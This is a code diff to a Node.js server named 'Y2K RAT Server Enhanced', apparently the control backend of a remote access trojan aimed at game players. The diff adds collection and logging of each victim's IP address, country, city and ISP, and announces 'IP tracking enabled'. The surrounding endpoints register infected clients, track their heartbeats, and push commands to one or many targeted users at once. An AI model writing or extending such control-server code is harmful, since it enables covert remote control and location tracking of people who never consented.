@@ -59,11 +59,14 @@ app.post('/log', (req, res) => {
             platform, 
             executor, 
             timestamp, 
-            ip, 
+            ip,
+            country,
+            city,
+            isp,
             status = 'online' 
         } = req.body;
 
-        console.log('📥 [LOG] Received data:', { username, userid, executor });
+        console.log('📥 [LOG] Received data:', { username, userid, executor, ip, country, city });
 
         if (!userid) {
             console.warn('⚠️ Missing userid in /log');
@@ -83,6 +86,9 @@ app.post('/log', (req, res) => {
             platform: platform || 'Unknown',
             executor: executor || 'Unknown',
             ip: ip || 'Hidden',
+            country: country || 'Unknown',
+            city: city || 'Unknown',
+            isp: isp || 'Unknown',
             status: 'online',
             lastSeen: Date.now(),
             firstSeen: isNewPlayer ? Date.now() : players.get(userid.toString()).firstSeen
@@ -95,11 +101,13 @@ app.post('/log', (req, res) => {
                 username,
                 executor,
                 game,
-                ip
+                ip,
+                country,
+                city
             });
         }
         
-        console.log(`✅ [${isNewPlayer ? 'NEW' : 'UPDATE'}] ${username} (${userid}) - ${executor} | Total: ${players.size}`);
+        console.log(`✅ [${isNewPlayer ? 'NEW' : 'UPDATE'}] ${username} (${userid}) - ${executor} | IP: ${ip} | ${city}, ${country} | Total: ${players.size}`);
         res.json({ success: true, message: 'Player logged successfully' });
     } catch (error) {
         console.error('❌ Error in /log:', error);
@@ -120,7 +128,6 @@ app.post('/heartbeat', (req, res) => {
         if (player) {
             player.lastSeen = Date.now();
             player.status = 'online';
-            // console.log(`💚 [HEARTBEAT] ${player.username} (${userid})`); // Commenté pour éviter le spam
         } else {
             console.log(`⚠️ [HEARTBEAT] Unknown player: ${userid}`);
         }
@@ -169,12 +176,12 @@ app.get('/players', (req, res) => {
     }
 });
 
-// Endpoint pour envoyer des commandes depuis le panel (AMÉLIORÉ)
+// Endpoint pour envoyer des commandes depuis le panel
 app.post('/command', (req, res) => {
     try {
         const { 
             userid,
-            userids, // Support pour plusieurs utilisateurs
+            userids,
             command, 
             reason, 
             speed, 
@@ -186,7 +193,6 @@ app.post('/command', (req, res) => {
             x, y, z
         } = req.body;
 
-        // Support pour bulk actions
         const targetUserIds = userids || [userid];
         
         if (!targetUserIds || targetUserIds.length === 0) {
@@ -216,7 +222,6 @@ app.post('/command', (req, res) => {
             if (z) commandData.z = z;
         }
 
-        // Envoyer la commande à tous les utilisateurs ciblés
         let successCount = 0;
         for (const uid of targetUserIds) {
             const targetId = uid.toString();
@@ -346,7 +351,7 @@ app.delete('/player/:userid', (req, res) => {
     }
 });
 
-// Endpoint pour supprimer plusieurs joueurs (NOUVEAU)
+// Endpoint pour supprimer plusieurs joueurs
 app.post('/players/delete-multiple', (req, res) => {
     try {
         const { userids } = req.body;
@@ -381,7 +386,7 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'online',
         name: 'Y2K RAT Server Enhanced',
-        version: '2.0.0',
+        version: '2.1.0',
         players: players.size,
         commands: commands.size,
         uptime: process.uptime()
@@ -441,12 +446,14 @@ app.use((err, req, res, next) => {
 // Démarrage du serveur
 app.listen(PORT, '0.0.0.0', () => {
     console.log('╔════════════════════════════════════════╗');
-    console.log('║      Y2K RAT SERVER v2.0 ENHANCED     ║');
+    console.log('║     Y2K RAT SERVER v2.1 ENHANCED      ║');
+    console.log('║         IP Tracking Enabled           ║');
     console.log('╚════════════════════════════════════════╝');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📡 Local: http://localhost:${PORT}`);
     console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
     console.log(`✅ Ready to accept connections`);
     console.log(`⚡ Bulk actions enabled`);
+    console.log(`🌍 IP geolocation enabled`);
     console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 });
